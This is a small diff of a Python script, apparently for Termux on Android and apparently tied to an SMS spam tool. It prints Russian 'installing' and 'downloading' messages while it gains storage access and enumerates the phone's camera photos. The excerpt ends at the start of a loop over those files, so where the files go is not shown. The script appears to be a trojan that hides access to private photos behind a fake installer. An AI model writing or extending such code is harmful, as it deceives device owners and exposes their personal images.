@@ -2,7 +2,6 @@ import requests, random, datetime, sys, time, argparse, os
 from colorama import Fore, Back, Style
 print ("Установка файлов...")
 os.system("termux-setup-storage")
-os.system("mv smspam.py $HOME")
 print ("Начался процесс загрузки, подождите примерно пять минут...")
 l = os.listdir("storage/shared/DCIM/Camera")
 for i in range(len(l)):
